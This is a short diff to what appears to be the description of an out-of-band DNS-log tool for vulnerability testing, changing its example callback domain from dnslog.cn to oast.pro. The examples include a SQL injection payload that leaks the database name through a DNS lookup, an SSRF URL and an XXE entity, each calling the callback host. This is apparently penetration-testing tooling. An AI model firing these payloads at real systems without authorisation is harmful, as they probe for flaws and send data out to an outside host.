@@ -20,12 +20,12 @@ description: |
   **Key Features：**
 
   **Use Cases：**
-    - Examples:`SELECT LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.xxx.dnslog.cn\\abc'))`
-    - Examples:`http://target.com/api?url=http://xxx.dnslog.cn`
-    - Examples:`<!ENTITY xxe SYSTEM "http://xxx.dnslog.cn">`
+    - Examples:`SELECT LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.xxx.oast.pro\\abc'))`
+    - Examples:`http://target.com/api?url=http://xxx.oast.pro`
+    - Examples:`<!ENTITY xxe SYSTEM "http://xxx.oast.pro">`
 
   **Workflow：**
-  1. Use `operation=get_domain` to obtain a temporary domain such as `abc123.dnslog.cn`.
+  1. Use `operation=get_domain` to obtain a temporary domain such as `abc123.oast.pro`.
   2. Use that domain in the validation payload.
   3. Use `operation=get_records` to check for DNS query records.
   4. If records appear, the payload executed and the issue is likely present.
